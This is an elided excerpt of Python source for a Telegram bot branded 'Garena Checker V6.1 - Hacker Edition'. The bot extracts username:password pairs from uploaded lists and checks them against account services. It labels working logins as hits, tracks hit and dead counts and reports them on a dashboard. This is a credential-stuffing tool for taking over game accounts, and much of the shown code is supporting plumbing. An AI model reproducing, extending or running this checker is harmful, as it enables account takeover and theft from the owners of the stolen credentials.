...
SESSION_STATS = {"total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0, 
...
def save_stats(data):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass
...
def update_stats(hit=0, dead=0, err=0, accounts=None, details=None):
    ...
    if accounts:
        data["history"].append({"time": datetime.now().isoformat(), "total": len(accounts), "hits": hit, "dead": dead, "errors": err})
    ...
    with SESSION_LOCK:
        ...
        if details:
            ...
            if len(SESSION_STATS["accounts_checked"]) > 1000: SESSION_STATS["accounts_checked"] = SESSION_STATS["accounts_checked"][-1000:]
            if len(SESSION_STATS["recent_checks"]) > 50: SESSION_STATS["recent_checks"] = SESSION_STATS["recent_checks"][-50:]
    save_stats(data)
    return data
...
class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            ...
            data = load_stats()
            with SESSION_LOCK:
                session_data = {"session": SESSION_STATS, "uptime": time.time() - start_time, "is_checking": checking}
            self.wfile.write(json.dumps({"status": "alive", "checking": checking, "stats": stats, 
            ...
            self.end_headers()
            with SESSION_LOCK:
                session_data = {"session": SESSION_STATS, "uptime": time.time() - start_time, 
                               "current_time": datetime.now().isoformat(), "is_checking": checking,
                               "services": list(SERVICE_ROUTES.keys()), "recent_accounts": SESSION_STATS["recent_checks"][-50:]}
    ...
    def get_audio_data(self):
        ...
        with AUDIO_LOCK:
            if CUSTOM_AUDIO_DATA: return CUSTOM_AUDIO_DATA
    ...
    def generate_default_audio(self):
        try:
            ...
            for i in range(samples):
                t = i / sr
                v = int(32767 * 0.3 * (math.sin(2 * math.pi * 440 * t) * 0.4 + math.sin(2 * math.pi * 554 * t) * 0.3 +
                                       math.sin(2 * math.pi * 659 * t) * 0.2 + math.sin(2 * math.pi * 880 * t) * 0.15 +
                                       math.sin(2 * math.pi * 1100 * t) * 0.1 + math.sin(2 * math.pi * 220 * t) * 0.2))
                buf += struct.pack('<h', v)
            hdr = b'RIFF' + struct.pack('<I', 36 + len(buf)) + b'WAVEfmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sr, sr * 2, 2, 16) + b'data' + struct.pack('<I', len(buf))
    ...
    def generate_dashboard(self):
        ...
        with SESSION_LOCK:
            s_hits, s_dead, s_err, s_chk = SESSION_STATS["total_hits"], SESSION_STATS["total_dead"], SESSION_STATS["total_errors"], SESSION_STATS["total_checked"]
        data = load_stats()
        services_html = "".join([f'<div class="sc"><span class="si">{v["icon"]}</span><span class="sn">{k}</span><span class="sd">{v["desc"]}</span></div>' for k,v in SERVICE_ROUTES.items()])
        return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GARENA CHECKER V6.1</title>
...
.status-badge{{display:inline-block;padding:8px 20px;border-radius:50px;font-weight:700;margin-top:10px;background:{'#ff9800' if checking else '#4caf50'};color:#fff}}
...
<div class="container">
<div class="header"><div class="title">🎮 GARENA CHECKER</div><div class="subtitle">Version 6.1 - HACKER EDITION | Admin: @baohuyno1</div>
<div class="status-badge" id="status">{'🔴 Dang check' if checking else '🟢 San sang'}</div>
...
def start_server():
    ...
    if os.path.exists(CUSTOM_AUDIO_PATH):
        try:
            with open(CUSTOM_AUDIO_PATH, 'rb') as f: CUSTOM_AUDIO_DATA = f.read()
...
def fix_encoding(text):
    ...
    replacements = {'Ã¡':'á','Ã ':'à','áº£':'ả','Ã£':'ã','áº¡':'ạ','Ä':'Đ','Ä':'Đ','Æ°':'ư','Æ¡':'ơ','Ã´':'ô','Ã¢':'â','Äƒ':'ă','Ãª':'ê','Ã­':'í','Ã¬':'ì','á»‹':'ị','á»‰':'ỉ','Ä©':'ĩ','Ã³':'ó','Ã²':'ò','Ãº':'ú','Ã¹':'ù','Ã½':'ý','á»³':'ỳ','á»·':'ỷ','á»µ':'ỵ','Nghiá»‡p':'Nghiệp','Hoáº£':'Hoả','YÃªu':'Yêu','Háº­u':'Hậu','Tháº¿':'Thế','Tá»­':'Tử','Nguyá»‡t':'Nguyệt','Tá»™c':'Tộc','SiÃªu':'Siêu','viá»‡t':'việt','KhÃ´ng':'Không','Äao':'Đao','phá»§':'phủ','táº­n':'tận','tháº¿':'thế','Giai':'Giai','Ä‘iá»‡u':'điệu','GiÃ¡ng':'Giáng','Sinh':'Sinh','Äá»“ng':'Đồng','phá»¥c':'phục','Cáº¥p':'Cấp','Tá»‘i':'Tối','ThÆ°á»£ng':'Thượng','hÃ nh':'hành','K.CÆ°Æ¡ng':'K.Cương','Tel\'Annas':'Tel\'Annas','VÅ©':'Vũ','khÃºc':'khúc','yÃªu':'yêu'}
    for old, new in replacements.items(): text = text.replace(old, new)
    if any(c in text for c in ['Ã','Ä','Æ','á»','áº','Å©','Ä©']):
        try: text = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
        except: pass
    return text

def format_value(v):
    if isinstance(v, bool): return "Yes" if v else "No"
    if isinstance(v, str) and v.lower() in ["true", "false"]: return "Yes" if v.lower() == "true" else "No"
...
def safe_send(chat_id, text, parse="HTML"):
    ...
    if len(text) > MAX_MESSAGE_LENGTH:
        ...
        for p in parts:
            try: bot.send_message(chat_id, p.strip(), parse_mode=parse); time.sleep(.1)
            except: 
                try: bot.send_message(chat_id, p.strip())
                except: pass
    else:
        try: bot.send_message(chat_id, text, parse_mode=parse)
        except: 
...
def check_membership(msg):
    ...
    try: bot.send_message(msg.chat.id, "👇 Xac nhan:", reply_markup=mk)
    except: pass
    return False
...
def loc_accounts(content):
    ...
    for line in content.split('\n'):
        line = line.strip()
        if not line or re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line) or re.match(r'^\d+$', line): continue
        for u,p in re.findall(pattern, line):
            if len(u)>=2 and len(p)>=1 and not re.match(r'^\d+$', u) and not re.match(r'^\d+$', p):
                key = f"{u}:{p}"
                if key not in seen:
                    seen.add(key); accounts.append((u,p))
    return accounts
            ...
            try:
                ...
                if isinstance(data, dict):
                    for k,v in data.items():
                        if isinstance(v, str): data[k] = fix_encoding(v)
                    hit = False
                    if data.get('status') in [True, "true", "success", "hit"]: hit = True
                    elif data.get('success') in [True, "true"]: hit = True
                    elif data.get('result') in ["hit", "success", "valid"]: hit = True
                    elif any(k in data for k in ["uid", "name", "nickname", "aov_name", "email", "phone"]):
                        if data.get('status') != "dead": hit = True
                    data["result"] = "hit" if hit else "dead"
                    with cache_lock: cache_results[cache_key] = data
                    return data
            except:
